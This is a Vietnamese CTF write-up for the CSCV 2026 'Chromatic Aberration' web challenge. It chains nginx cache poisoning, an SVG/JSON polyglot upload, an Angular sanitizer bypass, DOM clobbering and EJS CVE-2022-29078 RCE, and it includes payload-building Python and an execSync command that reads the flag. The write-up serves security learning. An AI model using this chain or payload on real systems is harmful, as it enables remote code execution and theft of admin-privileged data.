---
title: Chromatic Aberration

---

# Chromatic Aberration - CSCV 2026

## Recon & Review Source

### Source


| Service | Image / Stack | Vai trò |
|---|---|---|
| `edge` | nginx:1.27-alpine | reverse proxy + cache response cho `/api/*` |
| `web` | node:22-bookworm-slim, express 4.21.2, multer 1.4.5-lts.2 | upload media (`file --mime-type` sniffing), manifest workspace, telemetry, report→bot, **admin** export-preview |
| `bot` | node:22 + playwright | headless Chromium vào `/w/<24-hex>` với **cookie httpOnly `chromatic_admin`** (admin token) |
| `renderer` | node:22, **ejs 3.1.6**, express 4.21.2 | render "board preview" từ theme người dùng — **flag nằm đây** |


- `edge/nginx.conf` → proxy_cache + map $request_uri (điểm chính của chall)
- `web/server/server.js` → toàn bộ API surface
- `web/server/static/board-compat.js` → gadget không được app nào tham chiếu ("old archive")
- `web/frontend/src/main.ts` → Angular 20.3 workspace component (fetch manifest)
- `web/frontend/src/legacy-blocks.ts` → render **archive block** cũ
- `renderer/app.js / worker.js` → spawn worker render EJS với theme tuỳ ý
- `renderer/Dockerfile` → COPY `flag.txt /flag (chmod 0400)` + cp `/usr/bin/cat /readflag` (setuid 4755!)
- `bot/bot.js` → addCookies(chromatic_admin, httpOnly, sameSite Strict) → goto /w/<W>


1. **nginx cache key bất thường** (`edge/nginx.conf`):

   ```nginx
   map $request_uri $representation_id {
       "~*[?&]workspace=(?<workspace_id>[0-9a-f]{24})(?:&|$)" $workspace_id;
       default $request_uri;
   }
   ...
   proxy_cache_key "$scheme|$request_method|$representation_id";
   proxy_cache_methods GET HEAD;
   proxy_cache_valid 200 10m;
   proxy_ignore_headers Set-Cookie;
   ```

 - Khi URI chứa `workspace=<24 hex>` (case-insensitive), cache key **chỉ còn lại workspace-id**, **path bị bỏ hoàn toàn** → `GET /api/bất_cứ_gì?workspace=<W>` và `GET /api/workspaces/manifest?workspace=<W>` (fetch duy nhất của trang Angular khi bot mở `/w/<W>`) dùng chung một cache entry

2. `board-compat.js` 
- là file mồ côi nằm ở `/static/board-compat.js`, không `index.html` hay bundle Angular nào load nó
- Nó đọc `window.__chromaticBridge`, nếu `mode === 'snapshot'` thì `POST atob(payload)` tới một endpoint `/api/...` bất kỳ rồi exfil response text về `/api/telemetry/<channel 24-hex>` → rõ ràng là gadget của workflow cũ 

3. `legacy-blocks.ts`
- block `kind:"archive"` với `packet` base64 → `{version:"canvas-1", markup, integrity: FNV-1a(markup)}` → render bằng **`bypassSecurityTrustHtml(markup)`** và gán vào `[innerHTML]` → bypass toàn bộ sanitizer của Angular
- thêm chi tiết `styles.css` có sẵn rule `.board-block iframe {...}` → xác nhận ý đồ inject `<iframe>` qua markup

4. **Upload endpoint chỉ chấp nhận image** theo `file --brief --mime-type` (chỉ 6 mime: svg/png/jpeg/gif/webp/bmp) và chặn `hasDocumentPreamble()` (file bắt đầu bằng `{`/`[` sau BOM/whitespace)

5. **`renderer/worker.js`**
- `mergeCatalog(options, job.theme)` copy toàn bộ key của `theme` vào **EJS render options** (filter `__proto__` nhưng **không filter `constructor`**). Và **ejs bị pin ở 3.1.6** version trước bản vá CVE-2022-29078 (không validate `outputFunctionName`)

6. **Flag protection** (`renderer/Dockerfile`)
- `/flag` chỉ root đọc được (0400), nhưng có `/readflag` = bản copy setuid-root của `cat` → RCE với user `renderer` vẫn đọc được bằng `/readflag /flag`

7. **docker-compose.yml** có `ADMIN_TOKEN`/`BOT_SHARED_SECRET` giá trị `local-*` kèm comment *"change this in production"* 
- instance remote chắc chắn đã đổi → phải đi đủ chain qua bot, không dùng được shortcut (thử trên remote: `403 administrator session required`)

8. **Angular 20 fetch backend** (đọc từ bundle `main-*.js` đã build):

   ```js!
   case "json":
     let s = new TextDecoder().decode(r).replace(PI, "");   // PI = /^\)\]\}',?\n/  ← XSSI strip!
     if (s === "") return null;
     try { return JSON.parse(s) }                            // parse bất kể Content-Type!
     catch (a) { if (i < 200 || i >= 300) return s; throw a }
   ```

 - HttpClient tự strip prefix XSSI `)]}'\n` trước khi `JSON.parse` (google chống JSON-hijacking) và hoàn toàn không quan tâm `Content-Type` của response


## Vuln

### Web cache deception/key confusion (nginx)

- Key `"$scheme|$request_method|$representation_id"` với `representation_id` = workspace-id khi có query `workspace=<24-hex>` ⇒ mọi route `/api/*` GET có cùng `?workspace=W` chia sẻ một cache entry
- ta chọn nội dung được cache bằng cách gọi route mình kiểm soát được body (`/api/telemetry/<C>`, `/api/media/raw?id=<asset>`) kèm `?workspace=<W>`, response đó sẽ được trả cho lời fetch manifest duy nhất của bot

### Manifest polyglot: XSSI strip × libmagic × preamble check
- Ba parser nhìn cùng một file khác nhaum, đúng tinh thần tên challenge *Chromatic Aberration* (các **bước sóng** hội tụ khác nhau):

| Parser | Cách nhìn file |
|---|---|
| `file --mime-type` | rule JSON neo ở offset 0; **rule `<!doctype svg` là search/4096 (match bất kỳ đâu trong 4096 byte đầu)** → `image/svg+xml` |
| `hasDocumentPreamble` | chỉ đọc 64 byte đầu, bỏ qua BOM + `{09,0A,0D,20}` rồi chặn `{`/`[` — byte `)` đầu file ⇒ pass |
| Angular `parseBody` | UTF-8 decode → **strip `^\)\]\}',?\n`** → `JSON.parse` toàn bộ phần còn lại |

⇒ File **polyglot**:

```
)]}'\n{"blocks":[{"kind":"archive","packet":"..."}],"pad":"<!doctype svg"}
```

- `)` đứng đầu ⇒ qua preamble check;
- prefix `)]}'\n` làm rule JSON (neo offset 0) không match, còn chuỗi `<!doctype svg` nằm trong giá trị JSON kích hoạt **standalone search rule** của libmagic (đã dump magic.mgc xác nhận: record cont_level=0, flags=0x14, range=4096, mime=image/svg+xml) ⇒ upload được nhận là `.svg`;
- Angular fetch → strip XSSI prefix → `JSON.parse` ⇒ manifest của attacker

(Dead path: telemetry `{"sample":...}` làm template throw `board.blocks.length`; file SVG thuần không JSON.parse được; `file` không dùng extension; 64-byte-whitespace bypass cũng bị JSON magic chặn)

###  Sanitizer bypass qua "archive block" (`legacy-blocks.ts`)

- `packet` chứa `{version:"canvas-1", markup, integrity}` với `integrity` = FNV-1a-32 của `markup` (checksum tự tính trên dữ liệu của chính attacker, không phải integrity boundary)
- Markup hợp lệ được render bằng `bypassSecurityTrustHtml` rồi gán `[innerHTML]` ⇒ HTML tuỳ ý trong trang của bot
- CSP chặn inline script nhưng không chặn `<iframe srcdoc>` + `<script src='/static/board-compat.js'>` (script-src `'self'` cho phép script same-origin chạy bên trong srcdoc iframe, connect-src `'self'` cho phép fetch POST)

### DOM clobbering → CSRF gadget có cookie admin (`board-compat.js`)

Trong srcdoc iframe:

```html
<form id='__chromaticBridge'>
  <input name='mode' value='snapshot'>
  <input name='endpoint' value='/api/admin/export-preview'>
  <input name='channel' value='<24-hex exfil>'>
  <input name='payload' value='<base64 body>'>
</form>
<script src='/static/board-compat.js'></script>
```

- `window.__chromaticBridge` bị clobber bởi form (named access), `settings['mode']` trả về input element ⇒ `.value = 'snapshot'`, đủ điều kiện kích hoạt gadget
- Gadget `fetch(endpoint, {method:'POST', body: atob(payload)})` same-origin nên cookie httpOnly admin được tự động gắn kèm (credentials mặc định `same-origin`), rồi `.then(r => r.text())` POST response về telemetry
- form phải đặt TRƯỚC script, script chạy sync lúc parse, form chưa tồn tại thì clobber thất bại (đã debug trên browser thật)

### EJS 3.1.6 `outputFunctionName` RCE (CVE-2022-29078)

`mergeCatalog(options, job.theme)` ghi thẳng key của theme vào EJS options. ejs 3.1.6 (chưa có validate):

```js
prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
```

⇒ `theme.outputFunctionName` = code JavaScript được nhúng thẳng vào template function:

```!
x; __append(process.mainModule.require('child_process').execSync('/readflag /flag 2>&1').toString()); var y
```

- `__append(...)` băm output vào `html` của response, flag quay về response của `/api/admin/export-preview`, tức là sample mà gadget exfil về telemetry
- chạy trực tiếp `cat /flag` không được → file root-only; phải dùng setuid `/readflag /flag`. Path pollution `constructor.prototype` cũng dùng được nhưng không cần vì set key trực tiếp đã works

### Chuỗi trust bị break

```
nginx (key sai) → Angular (XSSI strip + không soi Content-Type) → sanitizer (bypass)
→ DOM clobbering (gadget cũ) → ejs options (không validate) → setuid /readflag
```

## Exploit 

### build payload RCE cho renderer

```python!
RCE = ("x; __append(process.mainModule.require('child_process')"
       ".execSync('/readflag /flag 2>&1').toString()); var y")
inner = json.dumps({"theme": {"outputFunctionName": RCE}, "title": "pwn"})
payload = base64.b64encode(inner.encode()).decode()      # base64 cho <input name=payload>
```

### craft markup của archive block (gadget)

```python!
markup = ("<iframe srcdoc=\"&lt;form id='__chromaticBridge'&gt;"
          "&lt;input name='mode' value='snapshot'&gt;"
          "&lt;input name='endpoint' value='/api/admin/export-preview'&gt;"
          f"&lt;input name='channel' value='{C}'&gt;"
          f"&lt;input name='payload' value='{payload}'&gt;"
          "&lt;/form&gt;&lt;script src='/static/board-compat.js'&gt;&lt;/script&gt;\"></iframe>")
```

Lưu ý escape HTML cho attribute `srcdoc` (`&lt;` `&gt;`) và **form đứng trước script**.

### đóng gói archive block + polyglot

```python!
packet = base64.b64encode(json.dumps(
    {"version": "canvas-1", "markup": markup, "integrity": fnv1a(markup)}).encode()).decode()
manifest = json.dumps({"name": "p", "owner": "p",
                       "blocks": [{"kind": "archive", "packet": packet}],
                       "pad": "<!doctype svg"})
polyglot = b")]}\'\n" + manifest.encode()
```

`"pad": "<!doctype svg"` chỉ để libmagic classify `image/svg+xml`.

### Upload

```python!
POST /api/media   (multipart, field 'image', filename a.svg, content-type image/svg+xml)
→ 201 {"id":"5d4742887db3460a03ae4d5c","mime":"image/svg+xml", ...}
```

### Poison cache key của bot

```python!
GET /api/media/raw?workspace=<W>&id=<asset>
→ 200, nginx cache MISS → body polyglot được lưu dưới key http|GET|<W>
```

### Gửi bot tới workspace

```python!
POST /api/report {"workspace": <W>}  → 202 {"queued":true}
```

Bot mở `/w/<W>` với cookie admin → Angular fetch manifest → **cache HIT (polyglot)** → strip XSSI → archive block render → iframe + clobber + board-compat.js → POST `/api/admin/export-preview` với `{"theme":{"outputFunctionName":...}}` → renderer thực thi `/readflag /flag` → response chứa flag → exfil về telemetry

### lấy flag

```python
GET /api/telemetry/<C>?r=<epoch>   (query ngẫu nhiên bypass cache)
→ {"sample":"{\"html\":\"CSCV2026{...}<!doctype html>...\"}"}
```
